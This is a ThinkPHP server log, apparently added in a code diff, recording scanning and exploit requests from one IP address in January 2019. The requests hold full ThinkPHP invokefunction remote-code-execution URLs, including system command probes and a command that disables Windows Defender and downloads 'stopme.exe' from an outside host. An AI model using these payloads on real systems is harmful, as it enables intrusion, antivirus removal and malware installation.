+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FRJCKQNQYHV.exe [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/RJCKQNQYHV.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T12:37:53+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FRJCKQNQYHV.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FRJCKQNQYHV.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/RJCKQNQYHV.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T13:11:50+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T13:11:53+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.062400s][吞吐率：16.03req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T13:11:54+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187201s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T13:11:56+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.156000s][吞吐率：6.41req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T13:11:58+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.436800s][吞吐率：2.29req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T13:15:02+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FSAQD4FH1Y8.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FSAQD4FH1Y8.exe [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/SAQD4FH1Y8.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T13:15:05+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FSAQD4FH1Y8.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FSAQD4FH1Y8.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/SAQD4FH1Y8.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T14:06:06+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T14:06:08+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.062400s][吞吐率：16.03req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T14:06:10+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T14:06:12+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.156000s][吞吐率：6.41req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T14:06:14+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.452400s][吞吐率：2.21req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
